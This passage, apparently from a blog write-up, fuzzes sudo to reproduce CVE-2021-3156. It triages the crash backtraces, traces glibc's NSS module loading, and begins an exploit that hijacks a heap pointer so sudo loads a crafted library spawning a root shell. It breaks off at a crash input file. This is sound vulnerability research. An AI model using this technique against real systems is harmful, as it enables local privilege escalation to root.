</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x000055555556e6ed in main (argc=8, argv=0x7fffffffec08, envp=0x7fffffffec50) at ./sudo.c:301</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Count</span>: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Files</span>: inp<span style=color:#ae81ff>.562039</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __pthread_kill_implementation (threadid=&lt;optimized out&gt;, signo=signo@entry=6, no_tid=no_tid@entry=0) at ./nptl/pthread_kill.c:44</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007ffff7e45e8f in __pthread_kill_internal (signo=6, threadid=&lt;optimized out&gt;) at ./nptl/pthread_kill.c:78</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007ffff7df6fb2 in __GI_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007ffff7de1472 in __GI_abort () at ./stdlib/abort.c:79</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00007ffff7e3a430 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7f54459 &#34;%s\n&#34;) at ../sysdeps/posix/libc_fatal.c:155</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  0x00007ffff7e4f7aa in malloc_printerr (str=str@entry=0x7ffff7f57138 &#34;double free or corruption (out)&#34;) at ./malloc/malloc.c:5660</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x00007ffff7e51810 in _int_free (av=0x7ffff7f8dc60 &lt;main_arena&gt;, p=0x555555585bb0, have_lock=&lt;optimized out&gt;, have_lock@entry=0) at ./malloc/malloc.c:4584</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x00007ffff7e53e8f in __GI___libc_free (mem=&lt;optimized out&gt;) at ./malloc/malloc.c:3385</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#8  0x00007ffff7ded799 in setname (name=0x7ffff7f5247c &lt;_nl_C_name&gt; &#34;C&#34;, category=6) at ./locale/setlocale.c:199</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#9  __GI_setlocale (category=&lt;optimized out&gt;, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:385</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#10 0x00007ffff7d114e6 in sudoers_setlocale (newlocale=1, prevlocale=0x7fffffffe4fc) at ./locale.c:120</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#11 0x00007ffff7d21753 in sudoers_policy_main (argc=25, argv=0x7fffffffe958, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffe5e0) at ./sudoers.c:327</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=25, argv=0x7fffffffe958, env_add=0x0, command_infop=0x7fffffffe6c8, argv_out=0x7fffffffe6d0, user_env_out=0x7fffffffe6d8) at ./policy.c:872</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#13 0x0000555555572f88 in policy_check (plugin=0x555555583920 &lt;policy_plugin&gt;, argc=25, argv=0x7fffffffe958, env_add=0x0, command_info=0x7fffffffe6c8, argv_out=0x7fffffffe6d0, user_env_out=0x7fffffffe6d8) at ./sudo.c:1186</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#14 0x000055555556e6ed in main (argc=27, argv=0x7fffffffe948, envp=0x7fffffffea28) at ./sudo.c:301</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Count</span>: <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Files</span>: inp<span style=color:#ae81ff>.562435</span>, inp<span style=color:#ae81ff>.563143</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __pthread_kill_implementation (threadid=&lt;optimized out&gt;, signo=signo@entry=6, no_tid=no_tid@entry=0) at ./nptl/pthread_kill.c:44</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007ffff7e45e8f in __pthread_kill_internal (signo=6, threadid=&lt;optimized out&gt;) at ./nptl/pthread_kill.c:78</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007ffff7df6fb2 in __GI_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007ffff7de1472 in __GI_abort () at ./stdlib/abort.c:79</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00007ffff7e3a430 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7f54459 &#34;%s\n&#34;) at ../sysdeps/posix/libc_fatal.c:155</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  0x00007ffff7e4f7aa in malloc_printerr (str=str@entry=0x7ffff7f56bb8 &#34;munmap_chunk(): invalid pointer&#34;) at ./malloc/malloc.c:5660</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x00007ffff7e4f96c in munmap_chunk (p=p@entry=0x5555555849a0) at ./malloc/malloc.c:3054</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x00007ffff7e53ed8 in __GI___libc_free (mem=mem@entry=0x5555555849b0) at ./malloc/malloc.c:3375</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#8  0x00007ffff7e30aa3 in _IO_deallocate_file (fp=0x5555555849b0) at ./libio/libioP.h:862</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#9  _IO_new_fclose (fp=fp@entry=0x5555555849b0) at ./libio/iofclose.c:74</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#10 0x00007ffff7ef5692 in __GI__nss_files_initgroups_dyn (user=user@entry=0x55555558a588 &#34;root&#34;, group=group@entry=0, start=start@entry=0x7fffffffc268, size=size@entry=0x7fffffffc2c8, groupsp=groupsp@entry=0x7fffffffc2d0, limit=limit@entry=-1, errnop=0x7ffff7db86c0) at nss_files/files-initgroups.c:126</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#11 0x00007ffff7e8bbd0 in internal_getgrouplist (user=user@entry=0x55555558a588 &#34;root&#34;, group=group@entry=0, size=size@entry=0x7fffffffc2c8, groupsp=groupsp@entry=0x7fffffffc2d0, limit=limit@entry=-1) at ./grp/initgroups.c:101</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#12 0x00007ffff7e8be28 in getgrouplist (user=0x55555558a588 &#34;root&#34;, group=0, groups=0x7ffff7cb5010, ngroups=0x7fffffffc334) at ./grp/initgroups.c:156</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#13 0x00007ffff7fafde6 in sudo_getgrouplist2_v1 (name=0x55555558a588 &#34;root&#34;, basegid=0, groupsp=0x7fffffffc390, ngroupsp=0x7fffffffc384) at ./getgrouplist.c:105</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#14 0x00007ffff7d92953 in sudo_make_gidlist_item (pw=0x55555558a558, unused1=0x0, type=1) at ./pwutil_impl.c:272</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#15 0x00007ffff7d91367 in sudo_get_gidlist (pw=0x55555558a558, type=1) at ./pwutil.c:932</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#16 0x00007ffff7d89683 in runas_getgroups () at ./match.c:145</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#17 0x00007ffff7d772c7 in runas_setgroups () at ./set_perms.c:1714</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#18 0x00007ffff7d75ad8 in set_perms (perm=5) at ./set_perms.c:281</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#19 0x00007ffff7d6d559 in sudoers_lookup (snl=0x7ffff7db4ce0 &lt;snl&gt;, pw=0x55555558a558, validated=96, pwflag=0) at ./parse.c:303</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#20 0x00007ffff7d78776 in sudoers_policy_main (argc=6, argv=0x7fffffffce68, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffcaf0) at ./sudoers.c:328</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#21 0x00007ffff7d73a7c in sudoers_policy_check (argc=6, argv=0x7fffffffce68, env_add=0x0, command_infop=0x7fffffffcbd8, argv_out=0x7fffffffcbe0, user_env_out=0x7fffffffcbe8) at ./policy.c:872</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#22 0x0000555555572f88 in policy_check (plugin=0x555555583920 &lt;policy_plugin&gt;, argc=6, argv=0x7fffffffce68, env_add=0x0, command_info=0x7fffffffcbd8, argv_out=0x7fffffffcbe0, user_env_out=0x7fffffffcbe8) at ./sudo.c:1186</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#23 0x000055555556e6ed in main (argc=8, argv=0x7fffffffce58, envp=0x7fffffffcea0) at ./sudo.c:301</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Count</span>: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Files</span>: inp<span style=color:#ae81ff>.564004</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __pthread_kill_implementation (threadid=&lt;optimized out&gt;, signo=signo@entry=6, no_tid=no_tid@entry=0) at ./nptl/pthread_kill.c:44</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007ffff7e45e8f in __pthread_kill_internal (signo=6, threadid=&lt;optimized out&gt;) at ./nptl/pthread_kill.c:78</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007ffff7df6fb2 in __GI_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007ffff7de1472 in __GI_abort () at ./stdlib/abort.c:79</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00007ffff7e3a430 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7f54459 &#34;%s\n&#34;) at ../sysdeps/posix/libc_fatal.c:155</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  0x00007ffff7e4f7aa in malloc_printerr (str=str@entry=0x7ffff7f52040 &#34;corrupted size vs. prev_size&#34;) at ./malloc/malloc.c:5660</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x00007ffff7e5006e in unlink_chunk (p=p@entry=0x555555595210, av=0x7ffff7f8dc60 &lt;main_arena&gt;) at ./malloc/malloc.c:1623</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x00007ffff7e516db in _int_free (av=0x7ffff7f8dc60 &lt;main_arena&gt;, p=0x5555555941c0, have_lock=&lt;optimized out&gt;, have_lock@entry=0) at ./malloc/malloc.c:4612</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#8  0x00007ffff7e53e8f in __GI___libc_free (mem=&lt;optimized out&gt;) at ./malloc/malloc.c:3385</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#9  0x00007ffff7ded5b0 in __GI_setlocale (category=&lt;optimized out&gt;, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:401</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#10 0x00007ffff7d114e6 in sudoers_setlocale (newlocale=1, prevlocale=0x7fffffffd54c) at ./locale.c:120</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#11 0x00007ffff7d21753 in sudoers_policy_main (argc=14, argv=0x7fffffffd9a8, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffd630) at ./sudoers.c:327</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=14, argv=0x7fffffffd9a8, env_add=0x0, command_infop=0x7fffffffd718, argv_out=0x7fffffffd720, user_env_out=0x7fffffffd728) at ./policy.c:872</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#13 0x0000555555572f88 in policy_check (plugin=0x555555583920 &lt;policy_plugin&gt;, argc=14, argv=0x7fffffffd9a8, env_add=0x0, command_info=0x7fffffffd718, argv_out=0x7fffffffd720, user_env_out=0x7fffffffd728) at ./sudo.c:1186</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#14 0x000055555556e6ed in main (argc=16, argv=0x7fffffffd998, envp=0x7fffffffda20) at ./sudo.c:301</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>last_fuzzer_iteration: <span style=color:#ae81ff>565233</span>
</span></span><span style=display:flex><span>total unique crashes : <span style=color:#ae81ff>161</span>
</span></span></code></pre></div><p>As you can see, for each unique crash, we print the number of times that the crash happened, all input files that trigger the crash, and a sample backtrace. So, what do we do next?</p><h3 id=manual-triaging>Manual triaging</h3><p>We have 161 unique crashes. Welp, we simply manually analyze them one by one. In the <a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx" target=_blank rel="noopener noreferrer">sudo playlist from LiveOverflow</a>, we were looking for a crash in <code>__tsearch</code>. But I didn&rsquo;t observe any crashes there, ever. And I ran the fuzzer for hours. Maybe 1-2 days&mldr;</p><p>My dumb brain, in ignorance of what I was to expect when I started this journey, I swtitched <code>FROM ubuntu:20.04</code> in the <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/Dockerfile target=_blank rel="noopener noreferrer">Dockerfile</a> to <code>FROM debian:12.5</code> for reasons uncomprehendable to me. Well, ubuntu 20.04 is running <a href=https://packages.ubuntu.com/source/focal/glibc target=_blank rel="noopener noreferrer">glibc-2.31</a> and <code>__tsearch</code> appears in <a href=https://elixir.bootlin.com/glibc/glibc-2.31/source/nss/nsswitch.c#L417 target=_blank rel="noopener noreferrer">nss/nsswitch.c:__nss_lookup_function</a>.</p><p>However, Debian 12.5 is running <code>GNU C Library (Debian GLIBC 2.36-9+deb12u4) stable release version 2.36</code>. And if we look at the source code and the <a href=https://elixir.bootlin.com/glibc/glibc-2.36/A/ident/__tsearch target=_blank rel="noopener noreferrer">references of <code>__tsearch</code></a>, it is nowhere to be found in the nss library!</p><p>During my manual triaging, I was blaming the fuzzer for the absence of a <code>__tsearch</code> crash and didn&rsquo;t realize that there was no <code>__tsearch</code> to crash in the first place! Nevertheless, I didn&rsquo;t give up and went through the 161 crashes manually&mldr;</p><p>Some of them were easily discardable and others I loaded them into gdb to inspect things. Crashes that contained <code>__GI___nss_lookup_function</code> and <code>__nss_module_load</code> seemed the most promising ones. This is because these functions indicate that they load some native library. Our exploitation idea here is to corrupt some heap data so that they load an arbitrary library of our choice instead. If we manage to make <code>sudo</code> to load an arbitrary library, then it is game over. The reason is that we can craft a library that uses the <code>__attribute__ ((constructor))</code> to execute code upon loading, which can be an <code>execve("/bin/sh")</code>.</p><p>So, out of all the crashes, manual debugging, and trial and error, the one that eventually stood out was the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-v data-lang=v><span style=display:flex><span><span style=color:#a6e22e>Count</span>: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Files</span>: inp<span style=color:#ae81ff>.457687</span>, inp<span style=color:#ae81ff>.552213</span>, inp<span style=color:#ae81ff>.553068</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __nss_module_get_function (module=0x4242424242424242, name=name@entry=0x7ffff7f52525 &#34;initgroups_dyn&#34;) at ./nss/nss_module.c:336</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007ffff7eecfad in __GI___nss_lookup_function (ni=&lt;optimized out&gt;, fct_name=fct_name@entry=0x7ffff7f52525 &#34;initgroups_dyn&#34;) at ./nss/nsswitch.c:137</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007ffff7e8bb8c in internal_getgrouplist (user=user@entry=0x55555558e4f8 &#34;root&#34;, group=group@entry=0, size=size@entry=0x7fffffffd2f8, groupsp=groupsp@entry=0x7fffffffd300, limit=limit@entry=-1) at ./grp/initgroups.c:95</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007ffff7e8be28 in getgrouplist (user=0x55555558e4f8 &#34;root&#34;, group=0, groups=0x7ffff7c5e010, ngroups=0x7fffffffd364) at ./grp/initgroups.c:156</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00007ffff7fafde6 in sudo_getgrouplist2_v1 (name=0x55555558e4f8 &#34;root&#34;, basegid=0, groupsp=0x7fffffffd3c0, ngroupsp=0x7fffffffd3b4) at ./getgrouplist.c:105</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  0x00007ffff7d3b953 in sudo_make_gidlist_item (pw=0x55555558e4c8, unused1=0x0, type=1) at ./pwutil_impl.c:272</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x00007ffff7d3a367 in sudo_get_gidlist (pw=0x55555558e4c8, type=1) at ./pwutil.c:932</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x00007ffff7d32683 in runas_getgroups () at ./match.c:145</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#8  0x00007ffff7d202c7 in runas_setgroups () at ./set_perms.c:1714</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#9  0x00007ffff7d1ead8 in set_perms (perm=5) at ./set_perms.c:281</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#10 0x00007ffff7d16559 in sudoers_lookup (snl=0x7ffff7d5dce0 &lt;snl&gt;, pw=0x55555558e4c8, validated=96, pwflag=0) at ./parse.c:303</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#11 0x00007ffff7d21776 in sudoers_policy_main (argc=6, argv=0x7fffffffde98, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffdb20) at ./sudoers.c:328</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=6, argv=0x7fffffffde98, env_add=0x0, command_infop=0x7fffffffdc08, argv_out=0x7fffffffdc10, user_env_out=0x7fffffffdc18) at ./policy.c:872</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#13 0x0000555555572f88 in policy_check (plugin=0x555555583920 &lt;policy_plugin&gt;, argc=6, argv=0x7fffffffde98, env_add=0x0, command_info=0x7fffffffdc08, argv_out=0x7fffffffdc10, user_env_out=0x7fffffffdc18) at ./sudo.c:1186</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#14 0x000055555556e6ed in main (argc=8, argv=0x7fffffffde88, envp=0x7fffffffded0) at ./sudo.c:301</span>
</span></span></code></pre></div><p>As you can see, we are crashing in <code>__nss_module_get_function</code>, which when there is no crash, further down its path invokes <code>__nss_module_load</code>. We control the <code>module</code> argument, which is of type <a href=https://elixir.bootlin.com/glibc/glibc-2.36.9000/source/nss/nss_module.h#L61 target=_blank rel="noopener noreferrer"><code>struct nss_module</code></a>. I won&rsquo;t bore you with libc internals but will get straight to the point:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/* A NSS service module (potentially unloaded).  Client code should
</span></span></span><span style=display:flex><span><span style=color:#75715e>   use the functions below.  */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> nss_module
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> state;
</span></span><span style=display:flex><span>  <span style=color:#75715e>//...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Only used for __libc_freeres unloading.  */</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>handle;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>/* The next module in the list. */</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> nss_module <span style=color:#f92672>*</span>next;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>/* The name of the module (as it appears in /etc/nsswitch.conf).  */</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> name[];
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Let&#39;s examine the backtrace now and understand how we can reash
</span></span></span><span style=display:flex><span><span style=color:#75715e>// `__nss_module_load` from `__nss_module_get_function`.
</span></span></span><span style=display:flex><span><span style=color:#75715e>// Code heavily simplified.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// https://elixir.bootlin.com/glibc/glibc-2.36.9000/source/grp/initgroups.c#L95
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>internal_getgrouplist</span>() {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__nss_lookup_function</span> (nip, <span style=color:#e6db74>&#34;initgroups_dyn&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// https://elixir.bootlin.com/glibc/glibc-2.36.9000/source/nss/nsswitch.c#L137
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>__nss_lookup_function</span> (nss_action_list ni, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>fct_name)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>__nss_module_get_function</span> (ni<span style=color:#f92672>-&gt;</span>module, fct_name);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// https://elixir.bootlin.com/glibc/glibc-2.36.9000/source/nss/nss_module.c#L336
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>__nss_module_get_function</span> (<span style=color:#66d9ef>struct</span> nss_module <span style=color:#f92672>*</span>module, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>name)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#75715e>/* A successful dlopen might clobber errno.   */</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> saved_errno <span style=color:#f92672>=</span> errno;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>__nss_module_load</span> (module))
</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>__nss_module_load</span> (<span style=color:#66d9ef>struct</span> nss_module <span style=color:#f92672>*</span>module)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span> ((<span style=color:#66d9ef>enum</span> nss_module_state) <span style=color:#a6e22e>atomic_load_acquire</span> (<span style=color:#f92672>&amp;</span>module<span style=color:#f92672>-&gt;</span>state))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> <span style=color:#75715e>//nss_module_uninitialized
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>module_load</span> (module);
</span></span><span style=display:flex><span>      <span style=color:#75715e>//...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>module_load</span> (<span style=color:#66d9ef>struct</span> nss_module <span style=color:#f92672>*</span>module)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span> (module<span style=color:#f92672>-&gt;</span>name, <span style=color:#e6db74>&#34;files&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>module_load_nss_files</span> (module);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span> (module<span style=color:#f92672>-&gt;</span>name, <span style=color:#e6db74>&#34;dns&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>module_load_nss_dns</span> (module);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>handle;
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>shlib_name;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>__asprintf</span> (<span style=color:#f92672>&amp;</span>shlib_name, <span style=color:#e6db74>&#34;libnss_%s.so%s&#34;</span>,
</span></span><span style=display:flex><span>                    module<span style=color:#f92672>-&gt;</span>name, __nss_shlib_revision) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>      <span style=color:#75715e>/* This is definitely a temporary failure.  Do not update
</span></span></span><span style=display:flex><span><span style=color:#75715e>         module-&gt;state.  This will trigger another attempt at the next
</span></span></span><span style=display:flex><span><span style=color:#75715e>         call.  */</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> false;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    handle <span style=color:#f92672>=</span> <span style=color:#a6e22e>__libc_dlopen</span> (shlib_name); <span style=color:#75715e>//our job is done if __libc_dlopen succeeds
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//...
</span></span></span></code></pre></div><p>So, as you can see, if the following pre-conditions hold:</p><ol><li><code>module->state == 0</code></li><li><code>module->name</code> is a valid pointer to a string</li></ol><p>Then we can load the library named <code>libnss_%s.so.2</code>. Recall our stacktrace:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#0  __nss_module_get_function (module=0x4242424242424242, name=name@entry=0x7ffff7f52525 &#34;initgroups_dyn&#34;)
</span></span></span></code></pre></div><h3 id=exploit-development>Exploit development</h3><p>We control the function pointer <code>module</code> completely. However we have no leaks. Maybe with a partial overwrite of the pointer we are lucky and our pre-condtiions can be met. Here is the <code>inp.553068</code> file that causes this crash:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;input&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;gdbcmd&#34;</span>: [
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;gdb&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-q&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-iex&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;set confirm off&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-iex&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;set pagination off&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-iex&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;set disable-randomization on&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-iex&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;set exec-wrapper ./gdb-argv0-wrapper.sh ./////0edit&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-x&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;./gdbscript.py&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;--nh&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;--args&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;./0edit&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-hB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;-i&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;AAAAAAAAAAAAAAAAAAAA\\&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBB&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;BBBBBB&#34;</span>
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;cmd&#34;</span>: [
